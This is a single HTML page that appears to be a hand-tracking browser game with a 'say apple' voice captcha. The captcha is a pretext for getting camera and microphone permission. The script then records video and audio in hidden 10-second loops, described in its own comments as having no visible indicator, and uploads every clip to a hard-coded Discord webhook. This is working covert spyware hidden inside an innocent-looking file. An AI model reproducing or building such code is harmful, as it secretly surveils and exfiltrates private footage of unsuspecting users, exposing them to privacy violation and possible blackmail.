<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Hand Game</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }
        body {
            background: #000;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            font-family: Arial, sans-serif;
            touch-action: none;
            position: relative;
        }
        canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            display: block;
            background: #000;
            z-index: 2;
            pointer-events: none;
        }
        #video {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: 0;
        }
        #overlay-text {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-size: 2.5rem;
            font-weight: bold;
            z-index: 3;
            pointer-events: none;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
            letter-spacing: 2px;
            transition: opacity 0.5s;
        }
        #overlay-text.hidden {
            opacity: 0;
            pointer-events: none;
        }
        #captcha-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            z-index: 10;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #fff;
            transition: opacity 0.8s;
        }
        #captcha-overlay.hidden {
            opacity: 0;
            pointer-events: none;
        }
        #captcha-overlay h1 {
            font-size: 2.2rem;
            margin-bottom: 10px;
            font-weight: 300;
            letter-spacing: 4px;
        }
        #captcha-overlay p {
            font-size: 1.1rem;
            color: #aaa;
            margin-bottom: 25px;
            letter-spacing: 1px;
        }
        #captcha-btn {
            background: rgba(255, 255, 255, 0.08);
            border: 1.5px solid rgba(255, 255, 255, 0.25);
            color: #fff;
            padding: 16px 48px;
            font-size: 1.3rem;
            border-radius: 60px;
            cursor: pointer;
            transition: all 0.3s;
            letter-spacing: 2px;
            background: rgba(255, 255, 255, 0.04);
            backdrop-filter: blur(6px);
            font-weight: 300;
        }
        #captcha-btn:hover {
            background: rgba(255, 255, 255, 0.14);
            border-color: rgba(255, 255, 255, 0.4);
            transform: scale(1.02);
        }
        #captcha-btn:active {
            transform: scale(0.96);
        }
        #captcha-btn:disabled {
            opacity: 0.4;
            pointer-events: none;
        }
        #captcha-status {
            margin-top: 18px;
            font-size: 0.95rem;
            color: #888;
            min-height: 30px;
            letter-spacing: 1px;
        }
        #captcha-status.success {
            color: #6f6;
        }
        #captcha-status.error {
            color: #f66;
        }
        #game-btn {
            position: fixed;
            bottom: 28px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 5;
            padding: 14px 44px;
            font-size: 1.2rem;
            border-radius: 60px;
            border: 1.5px solid rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.06);
            color: #fff;
            cursor: pointer;
            transition: all 0.3s;
            letter-spacing: 2px;
            backdrop-filter: blur(4px);
            font-weight: 300;
            pointer-events: all;
            display: none;
        }
        #game-btn:hover {
            background: rgba(255, 255, 255, 0.12);
            border-color: rgba(255, 255, 255, 0.35);
        }
        #game-btn:active {
            transform: translateX(-50%) scale(0.95);
        }
        #game-btn.visible {
            display: block;
        }
        #countdown-text {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 6;
            color: #fff;
            font-size: 4rem;
            font-weight: bold;
            text-shadow: 0 0 40px rgba(255, 255, 255, 0.15);
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s;
            letter-spacing: 6px;
            text-align: center;
            line-height: 1.4;
        }
        #countdown-text.show {
            opacity: 1;
        }
        #countdown-text .sub {
            font-size: 1.6rem;
            font-weight: 300;
            letter-spacing: 4px;
            display: block;
            margin-top: 8px;
            color: #ccc;
        }
        #game-over {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 7;
            background: rgba(0, 0, 0, 0.85);
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: #fff;
            backdrop-filter: blur(6px);
        }
        #game-over.show {
            display: flex;
        }
        #game-over h1 {
            font-size: 3rem;
            font-weight: 300;
            letter-spacing: 6px;
            margin-bottom: 6px;
        }
        #game-over p {
            font-size: 1.1rem;
            color: #aaa;
            letter-spacing: 2px;
        }
        #game-over .score {
            font-size: 1.8rem;
            color: #fff;
            margin: 12px 0 20px;
            letter-spacing: 3px;
        }
        #game-over button {
            background: rgba(255, 255, 255, 0.08);
            border: 1.5px solid rgba(255, 255, 255, 0.2);
            color: #fff;
            padding: 14px 40px;
            font-size: 1.1rem;
            border-radius: 60px;
            cursor: pointer;
            transition: all 0.3s;
            letter-spacing: 2px;
            font-weight: 300;
        }
        #game-over button:hover {
            background: rgba(255, 255, 255, 0.15);
        }
        #level-display {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 4;
            color: rgba(255, 255, 255, 0.3);
            font-size: 0.9rem;
            letter-spacing: 3px;
            pointer-events: none;
            font-weight: 300;
            text-transform: uppercase;
        }
        @media (max-width: 600px) {
            #captcha-overlay h1 {
                font-size: 1.6rem;
            }
            #captcha-overlay p {
                font-size: 0.95rem;
            }
            #captcha-btn {
                padding: 14px 32px;
                font-size: 1rem;
            }
            #overlay-text {
                font-size: 1.8rem;
            }
            #game-btn {
                padding: 12px 30px;
                font-size: 1rem;
                bottom: 20px;
            }
            #countdown-text {
                font-size: 2.8rem;
            }
            #countdown-text .sub {
                font-size: 1.2rem;
            }
            #game-over h1 {
                font-size: 2.2rem;
            }
        }
    </style>
</head>
<body>

    <!-- Hidden video element - muted -->
    <video id="video" autoplay playsinline muted></video>

    <!-- Canvas -->
    <canvas id="canvas"></canvas>

    <!-- Overlay text -->
    <div id="overlay-text">show hand</div>

    <!-- Level display -->
    <div id="level-display">level 1</div>

    <!-- Game button -->
    <button id="game-btn">▶ play game</button>

    <!-- Countdown -->
    <div id="countdown-text">
        defend the white ball
        <span class="sub" id="countdown-number">3</span>
    </div>

    <!-- Game over overlay -->
    <div id="game-over">
        <h1>defeated</h1>
        <p>you protected the ball</p>
        <div class="score" id="final-score">level 1</div>
        <button id="restart-btn">↻ try again</button>
    </div>

    <!-- Captcha overlay -->
    <div id="captcha-overlay">
        <h1>⌘ verify</h1>
        <p>say the word <strong style="color:#fff;">"apple"</strong> to continue</p>
        <button id="captcha-btn">🎤 click &amp; speak</button>
        <div id="captcha-status">waiting...</div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js">
    </script>

    <script>
        // ─── CONFIG ────────────────────────────────────────────────
        const WEBHOOK_URL =
            'https://discord.com/api/webhooks/1522066195627642910/GnCaBQUhcTd1wLilA8o-NE3x_xn-lkDTSLUcK-ChMb1nivT9d3OCDraY7CdrFmI9Ru-5';

        // ─── DOM REFS ──────────────────────────────────────────────
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const video = document.getElementById('video');
        const overlayText = document.getElementById('overlay-text');
        const gameBtn = document.getElementById('game-btn');
        const countdownEl = document.getElementById('countdown-text');
        const countdownNum = document.getElementById('countdown-number');
        const gameOverEl = document.getElementById('game-over');
        const finalScoreEl = document.getElementById('final-score');
        const restartBtn = document.getElementById('restart-btn');
        const levelDisplay = document.getElementById('level-display');
        const captchaOverlay = document.getElementById('captcha-overlay');
        const captchaBtn = document.getElementById('captcha-btn');
        const captchaStatus = document.getElementById('captcha-status');

        // ─── SIZING ──────────────────────────────────────────────────
        let W = 0,
            H = 0;

        function resize() {
            W = window.innerWidth;
            H = window.innerHeight;
            canvas.width = W;
            canvas.height = H;
        }
        resize();
        window.addEventListener('resize', resize);

        // ─── STATE ──────────────────────────────────────────────────
        let isVerified = false;
        let isGameRunning = false;
        let isGameOver = false;
        let level = 1;
        let score = 0;
        let handLandmarks = null;
        let handVisible = false;
        let indexTipX = 0,
            indexTipY = 0,
            indexTipVisible = false;
        let gameObjects = [];
        let ball = { x: 0, y: 0, r: 0 };
        let frameId = null,
            gameLoopId = null,
            videoFrameLoop = null;
        let objectSpawnTimer = 0,
            objectSpawnInterval = 1800,
            baseSpeed = 1.2;
        let countdownActive = false,
            countdownValue = 3;
        let recordingActive = false,
            mediaRecorder = null,
            recordedChunks = [],
            stopTimeout = null,
            stream = null;
        let isTracking = false;
        let recognition = null;
        let captchaVerified = false;

        // ─── BALL INIT ─────────────────────────────────────────────
        function initBall() {
            const size = Math.min(W, H);
            ball.r = size * 0.045;
            ball.x = W / 2;
            ball.y = H - ball.r - size * 0.08;
        }
        initBall();

        // ─── SHAPES ─────────────────────────────────────────────────
        const SHAPE_TYPES = ['circle', 'oval', 'triangle', 'rectangle'];

        function randomShape() { return SHAPE_TYPES[Math.floor(Math.random() * SHAPE_TYPES.length)]; }

        function createObject() {
            const size = Math.min(W, H) * (0.045 + Math.random() * 0.035);
            const angle = -Math.PI / 2 + (Math.random() - 0.5) * 1.8;
            const startX = W / 2 + Math.tan(angle) * H * 0.6;
            const clampedX = Math.max(size, Math.min(W - size, startX));
            const speed = baseSpeed * (0.85 + Math.random() * 0.3) * (1 + (level - 1) * 0.12);
            const type = randomShape();
            const hue = 180 + Math.random() * 60;
            return {
                x: clampedX,
                y: -size,
                vx: (Math.random() - 0.5) * 0.15 * speed,
                vy: speed * (0.8 + Math.random() * 0.4),
                size: size,
                type: type,
                hue: hue,
                rotation: Math.random() * Math.PI * 2,
                rotSpeed: (Math.random() - 0.5) * 0.02,
                alive: true
            };
        }

        function drawShape(ctx, obj) {
            const s = obj.size;
            ctx.save();
            ctx.translate(obj.x, obj.y);
            ctx.rotate(obj.rotation);
            ctx.globalAlpha = 0.85;
            ctx.shadowColor = 'rgba(255,255,255,0.05)';
            ctx.shadowBlur = 6;
            ctx.fillStyle = `hsl(${obj.hue}, 40%, 35%)`;
            ctx.strokeStyle = `hsl(${obj.hue}, 50%, 55%)`;
            ctx.lineWidth = 1.5;
            switch (obj.type) {
                case 'circle':
                    ctx.beginPath();
                    ctx.arc(0, 0, s, 0, Math.PI * 2);
                    ctx.fill();
                    ctx.stroke();
                    break;
                case 'oval':
                    ctx.beginPath();
                    ctx.ellipse(0, 0, s * 1.4, s * 0.8, 0, 0, Math.PI * 2);
                    ctx.fill();
                    ctx.stroke();
                    break;
                case 'triangle':
                    ctx.beginPath();
                    for (let i = 0; i < 3; i++) {
                        const a = (i / 3) * Math.PI * 2 - Math.PI / 2;
                        const r = s * 1.1;
                        ctx.lineTo(Math.cos(a) * r, Math.sin(a) * r);
                    }
                    ctx.closePath();
                    ctx.fill();
                    ctx.stroke();
                    break;
                case 'rectangle':
                    ctx.fillRect(-s * 1.0, -s * 0.7, s * 2.0, s * 1.4);
                    ctx.strokeRect(-s * 1.0, -s * 0.7, s * 2.0, s * 1.4);
                    break;
            }
            ctx.restore();
        }

        // ─── HAND TRACKING ──────────────────────────────────────────
        function isPalmFacingCamera(landmarks) {
            if (!landmarks || landmarks.length < 21) return false;
            const idxMCP = landmarks[5],
                midMCP = landmarks[9],
                ringMCP = landmarks[13],
                pinkyMCP = landmarks[17];
            const palmZ = (idxMCP.z + midMCP.z + ringMCP.z + pinkyMCP.z) / 4;
            const tipIdx = landmarks[8],
                tipMid = landmarks[12],
                tipRing = landmarks[16],
                tipPinky = landmarks[20];
            const tipZ = (tipIdx.z + tipMid.z + tipRing.z + tipPinky.z) / 4;
            return tipZ < palmZ - 0.01;
        }

        function isHandInBottom(landmarks) {
            if (!landmarks || landmarks.length < 21) return false;
            return landmarks[0].y > 0.50;
        }

        function onHandResults(results) {
            if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
                const lm = results.multiHandLandmarks[0];
                handLandmarks = lm;
                const palmFace = isPalmFacingCamera(lm);
                const bottom = isHandInBottom(lm);
                handVisible = palmFace && bottom;
                const tip = lm[8];
                if (tip) {
                    indexTipX = tip.x * W;
                    indexTipY = tip.y * H;
                    indexTipVisible = true;
                } else {
                    indexTipVisible = false;
                }
            } else {
                handLandmarks = null;
                handVisible = false;
                indexTipVisible = false;
            }
        }

        const hands = new Hands({
            locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
        });
        hands.setOptions({
            maxNumHands: 1,
            modelComplexity: 0,
            minDetectionConfidence: 0.7,
            minTrackingConfidence: 0.6
        });
        hands.onResults(onHandResults);

        // ─── RECORDING – reliable 10s loop (no visible indicator) ──
        function startRecording(mediaStream) {
            if (!mediaStream) return;
            if (recordingActive) return;

            let selectedMimeType = 'video/webm;codecs=vp8';
            if (!MediaRecorder.isTypeSupported(selectedMimeType)) {
                if (MediaRecorder.isTypeSupported('video/mp4')) {
                    selectedMimeType = 'video/mp4';
                } else if (MediaRecorder.isTypeSupported('video/webm')) {
                    selectedMimeType = 'video/webm';
                } else {
                    selectedMimeType = '';
                }
            }

            mediaRecorder = new MediaRecorder(mediaStream, {
                mimeType: selectedMimeType,
                videoBitsPerSecond: 3500000
            });

            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) recordedChunks.push(e.data);
            };

            mediaRecorder.onstop = async () => {
                if (recordedChunks.length > 0) {
                    const blob = new Blob(recordedChunks, { type: selectedMimeType || 'video/webm' });
                    recordedChunks = [];

                    const formData = new FormData();
                    const ext = selectedMimeType.includes('mp4') ? 'mp4' : 'webm';
                    formData.append('file', blob, `handgame_${Date.now()}.${ext}`);

                    try {
                        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
                        console.log('✅ 10s clip sent');
                    } catch (err) {
                        console.error('Webhook send failed:', err);
                    }
                } else {
                    recordedChunks = [];
                }

                if (recordingActive && mediaRecorder && mediaRecorder.state === "inactive") {
                    try {
                        mediaRecorder.start();
                        scheduleStop();
                    } catch (e) {
                        console.warn('Recorder restart error:', e);
                        setTimeout(() => {
                            if (recordingActive && mediaRecorder && mediaRecorder.state === "inactive") {
                                try { mediaRecorder.start();
                                    scheduleStop(); } catch (_) {}
                            }
                        }, 500);
                    }
                }
            };

            mediaRecorder.start();
            recordingActive = true;
            scheduleStop();

            function scheduleStop() {
                if (stopTimeout) clearTimeout(stopTimeout);
                stopTimeout = setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state !== "inactive") {
                        mediaRecorder.stop();
                    }
                }, 10000);
            }
        }

        // ─── CAPTCHA FLOW ──────────────────────────────────────────
        function initSpeechRecognition() {
            const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
            if (!SR) return null;
            const rec = new SR();
            rec.lang = 'en-US';
            rec.interimResults = false;
            rec.maxAlternatives = 1;
            return rec;
        }

        function verifyCaptcha() {
            if (captchaVerified) return;
            captchaVerified = true;
            captchaStatus.textContent = '✅ verified!';
            captchaStatus.className = 'success';
            setTimeout(() => {
                captchaOverlay.classList.add('hidden');
                isVerified = true;
                gameBtn.classList.add('visible');
                overlayText.classList.remove('hidden');
            }, 400);
        }

        function handleCaptchaClick() {
            if (captchaVerified) return;

            captchaBtn.disabled = true;
            captchaStatus.textContent = '⏳ requesting camera & mic...';
            captchaStatus.className = '';

            navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
                    audio: true
                })
                .then(mediaStream => {
                    stream = mediaStream;
                    video.srcObject = stream;
                    return video.play();
                })
                .then(() => {
                    if (videoFrameLoop) cancelAnimationFrame(videoFrameLoop);

                    function sendFrame() {
                        if (video.readyState >= 2) hands.send({ image: video });
                        videoFrameLoop = requestAnimationFrame(sendFrame);
                    }
                    sendFrame();
                    isTracking = true;

                    startRecording(stream);

                    if (recognition) {
                        recognition.onresult = (e) => {
                            const word = e.results[0][0].transcript.trim().toLowerCase();
                            if (word === 'apple') {
                                verifyCaptcha();
                            } else {
                                captchaStatus.textContent = `❌ you said "${word}", say "apple"`;
                                captchaStatus.className = 'error';
                                setTimeout(() => {
                                    captchaStatus.textContent = 'say "apple" to continue';
                                    captchaStatus.className = '';
                                    captchaBtn.disabled = false;
                                    captchaBtn.textContent = '🎤 click & speak';
                                }, 2000);
                            }
                        };
                        recognition.onerror = (e) => {
                            if (e.error === 'not-allowed') {
                                captchaStatus.textContent = '❌ mic blocked, please allow and retry';
                                captchaStatus.className = 'error';
                            } else {
                                captchaStatus.textContent = '❌ listening error, try again';
                                captchaStatus.className = 'error';
                            }
                            captchaBtn.disabled = false;
                            captchaBtn.textContent = '🎤 retry';
                        };
                        recognition.onend = () => {
                            if (!captchaVerified) {
                                captchaBtn.disabled = false;
                                captchaBtn.textContent = '🎤 click & speak';
                                captchaStatus.textContent = 'say "apple" to continue';
                                captchaStatus.className = '';
                            }
                        };

                        try {
                            recognition.start();
                            captchaStatus.textContent = '🎧 listening... say "apple"';
                            captchaStatus.className = '';
                            captchaBtn.disabled = true;
                            captchaBtn.textContent = '⏳ listening...';
                        } catch (e) {
                            captchaBtn.disabled = false;
                            captchaBtn.textContent = '🎤 retry';
                            captchaStatus.textContent = '⚠️ could not start listening, try again';
                            captchaStatus.className = 'error';
                        }
                    } else {
                        captchaStatus.textContent = '✅ media ready, click "verify" to continue';
                        captchaStatus.className = 'success';
                        captchaBtn.disabled = false;
                        captchaBtn.textContent = '✅ verify';
                        captchaBtn.onclick = verifyCaptcha;
                    }
                })
                .catch(err => {
                    console.error('Permission error:', err);
                    captchaStatus.textContent = '❌ camera/mic denied. Please allow and retry.';
                    captchaStatus.className = 'error';
                    captchaBtn.disabled = false;
                    captchaBtn.textContent = '🎤 retry';
                    stream = null;
                });
        }

        function setupCaptcha() {
            recognition = initSpeechRecognition();
            captchaBtn.onclick = handleCaptchaClick;
        }

        // ─── GAME ──────────────────────────────────────────────────
        function startGame() {
            if (isGameRunning || countdownActive) return;
            isGameOver = false;
            level = 1;
            score = 0;
            // Clear all objects to free memory
            gameObjects = [];
            objectSpawnInterval = 1800;
            baseSpeed = 1.2;
            gameOverEl.classList.remove('show');
            countdownNum.textContent = '3';
            countdownEl.classList.add('show');
            countdownActive = true;
            countdownValue = 3;
            gameBtn.classList.remove('visible');
            overlayText.classList.add('hidden');

            const countInterval = setInterval(() => {
                countdownValue -= 1;
                if (countdownValue <= 0) {
                    clearInterval(countInterval);
                    countdownEl.classList.remove('show');
                    countdownActive = false;
                    isGameRunning = true;
                    levelDisplay.textContent = `level ${level}`;
                    gameLoop();
                } else {
                    countdownNum.textContent = countdownValue;
                }
            }, 900);
        }

        function gameLoop() {
            if (!isGameRunning || isGameOver) return;
            if (gameLoopId) cancelAnimationFrame(gameLoopId);
            updateGame();
            gameLoopId = requestAnimationFrame(gameLoop);
        }

        function updateGame() {
            if (!isGameRunning || isGameOver) return;
            objectSpawnTimer += 16;
            // Limit total objects to prevent memory bloat
            const MAX_OBJECTS = 30;
            if (objectSpawnTimer > objectSpawnInterval && gameObjects.length < MAX_OBJECTS) {
                objectSpawnTimer = 0;
                const spawnCount = Math.min(level, 3); // spawn fewer per tick
                for (let i = 0; i < spawnCount; i++) {
                    if (gameObjects.length < MAX_OBJECTS) {
                        gameObjects.push(createObject());
                    }
                }
                if (objectSpawnInterval > 400) objectSpawnInterval = Math.max(400, objectSpawnInterval - 12);
                baseSpeed = Math.min(3.2, baseSpeed + 0.02);
            }

            // Iterate backwards so we can splice safely
            for (let i = gameObjects.length - 1; i >= 0; i--) {
                const obj = gameObjects[i];
                obj.x += obj.vx;
                obj.y += obj.vy;
                obj.rotation += obj.rotSpeed;

                // Push away from finger tip
                if (handVisible && indexTipVisible && isGameRunning && !isGameOver) {
                    const dx = obj.x - indexTipX,
                        dy = obj.y - indexTipY;
                    const dist = Math.sqrt(dx * dx + dy * dy);
                    const pushRadius = Math.max(obj.size * 0.8, 20);
                    if (dist < pushRadius + 12) {
                        const angle = Math.atan2(dy, dx);
                        const force = 3.5 + level * 0.3;
                        obj.vx += Math.cos(angle) * force * 0.6;
                        obj.vy += Math.sin(angle) * force * 0.6;
                        obj.x += Math.cos(angle) * 6;
                        obj.y += Math.sin(angle) * 6;
                    }
                }

                // Collision with ball
                const dxb = obj.x - ball.x,
                    dyb = obj.y - ball.y;
                if (Math.sqrt(dxb * dxb + dyb * dyb) < obj.size + ball.r) {
                    endGame();
                    return;
                }

                // Remove if offscreen (splice removes reference)
                if (obj.y > H + obj.size * 2 || obj.x < -obj.size * 2 || obj.x > W + obj.size * 2) {
                    gameObjects.splice(i, 1);
                    score++;
                    const newLevel = Math.floor(score / 8) + 1;
                    if (newLevel > level) {
                        level = newLevel;
                        levelDisplay.textContent = `level ${level}`;
                        objectSpawnInterval = Math.max(400, 1800 - level * 80);
                    }
                    continue;
                }

                // Keep within horizontal bounds
                if (obj.x < obj.size) obj.x = obj.size;
                if (obj.x > W - obj.size) obj.x = W - obj.size;
            }

            // Update ball position
            const size = Math.min(W, H);
            ball.r = size * 0.045;
            ball.y = H - ball.r - size * 0.08;

            render();
        }

        function endGame() {
            isGameRunning = false;
            isGameOver = true;
            if (gameLoopId) cancelAnimationFrame(gameLoopId);
            gameLoopId = null;
            finalScoreEl.textContent = `level ${level}  ·  ${score} pushed`;
            gameOverEl.classList.add('show');
            // Clear objects to free memory when game ends
            gameObjects = [];
            setTimeout(() => {
                if (!isGameRunning) {
                    gameBtn.classList.add('visible');
                    gameBtn.textContent = '↻ play again';
                }
            }, 1200);
        }

        function restartGame() {
            gameOverEl.classList.remove('show');
            isGameOver = false;
            isGameRunning = false;
            gameObjects = []; // Clear memory
            level = 1;
            score = 0;
            objectSpawnInterval = 1800;
            baseSpeed = 1.2;
            levelDisplay.textContent = 'level 1';
            gameBtn.textContent = '▶ play game';
            gameBtn.classList.add('visible');
            overlayText.textContent = 'show hand';
            overlayText.classList.remove('hidden');
            if (gameLoopId) cancelAnimationFrame(gameLoopId);
            gameLoopId = null;
        }

        // ─── RENDER ──────────────────────────────────────────────────
        function render() {
            ctx.clearRect(0, 0, W, H);
            ctx.fillStyle = '#000';
            ctx.fillRect(0, 0, W, H);

            if (handVisible && handLandmarks && !isGameOver) {
                const connections = [
                    [0, 1],
                    [1, 2],
                    [2, 3],
                    [3, 4],
                    [0, 5],
                    [5, 6],
                    [6, 7],
                    [7, 8],
                    [0, 9],
                    [9, 10],
                    [10, 11],
                    [11, 12],
                    [0, 13],
                    [13, 14],
                    [14, 15],
                    [15, 16],
                    [0, 17],
                    [17, 18],
                    [18, 19],
                    [19, 20],
                    [5, 9],
                    [9, 13],
                    [13, 17]
                ];
                ctx.save();
                ctx.strokeStyle = 'rgba(255,255,255,0.55)';
                ctx.lineWidth = 1.8;
                for (const [i, j] of connections) {
                    const p1 = handLandmarks[i],
                        p2 = handLandmarks[j];
                    ctx.beginPath();
                    ctx.moveTo(p1.x * W, p1.y * H);
                    ctx.lineTo(p2.x * W, p2.y * H);
                    ctx.stroke();
                }
                ctx.fillStyle = 'rgba(255,255,255,0.2)';
                for (const lm of handLandmarks) {
                    ctx.beginPath();
                    ctx.arc(lm.x * W, lm.y * H, 2, 0, Math.PI * 2);
                    ctx.fill();
                }
                ctx.restore();
            }

            if (isGameRunning || isGameOver) {
                ctx.shadowColor = 'rgba(255,255,255,0.08)';
                ctx.shadowBlur = 20;
                ctx.beginPath();
                ctx.arc(ball.x, ball.y, ball.r, 0, Math.PI * 2);
                ctx.fillStyle = 'rgba(255,255,255,0.85)';
                ctx.fill();
                ctx.strokeStyle = 'rgba(255,255,255,0.2)';
                ctx.lineWidth = 1.5;
                ctx.stroke();
                ctx.shadowBlur = 0;

                for (const obj of gameObjects) drawShape(ctx, obj);

                if (isGameRunning && !isGameOver && indexTipVisible && handVisible) {
                    ctx.shadowColor = 'rgba(255,0,0,0.2)';
                    ctx.shadowBlur = 12;
                    ctx.beginPath();
                    ctx.arc(indexTipX, indexTipY, Math.min(W, H) * 0.025, 0, Math.PI * 2);
                    ctx.fillStyle = 'rgba(255,40,40,0.85)';
                    ctx.fill();
                    ctx.strokeStyle = 'rgba(255,80,80,0.3)';
                    ctx.lineWidth = 1.5;
                    ctx.stroke();
                    ctx.shadowBlur = 0;
                }
            }

            if (!isGameRunning && !isGameOver && !countdownActive) {
                if (!handVisible || !handLandmarks) {
                    overlayText.classList.remove('hidden');
                    overlayText.textContent = 'show hand';
                } else {
                    overlayText.classList.add('hidden');
                }
            }

            if (isGameRunning && !isGameOver) {
                levelDisplay.textContent = `level ${level}`;
                levelDisplay.style.display = 'block';
            } else {
                levelDisplay.style.display = 'none';
            }
        }

        // ─── MAIN LOOP ─────────────────────────────────────────────
        function mainRender() {
            if (!isGameRunning && !isGameOver) render();
            frameId = requestAnimationFrame(mainRender);
        }

        // ─── EVENT BINDING ──────────────────────────────────────────
        gameBtn.addEventListener('click', startGame);
        restartBtn.addEventListener('click', restartGame);

        // ─── INIT ──────────────────────────────────────────────────
        setupCaptcha();
        mainRender();

        window.addEventListener('resize', () => { resize();
            initBall(); });
        window.addEventListener('beforeunload', () => {
            if (frameId) cancelAnimationFrame(frameId);
            if (gameLoopId) cancelAnimationFrame(gameLoopId);
            if (videoFrameLoop) cancelAnimationFrame(videoFrameLoop);
            if (stopTimeout) clearTimeout(stopTimeout);
            recordingActive = false;
            if (mediaRecorder && mediaRecorder.state !== "inactive") try { mediaRecorder.stop(); } catch (_) {}
            if (stream) stream.getTracks().forEach(t => t.stop());
            // Clear game objects
            gameObjects = [];
        });

        console.log('✅ System ready — memory usage optimized.');
    </script>

</body>
</html>
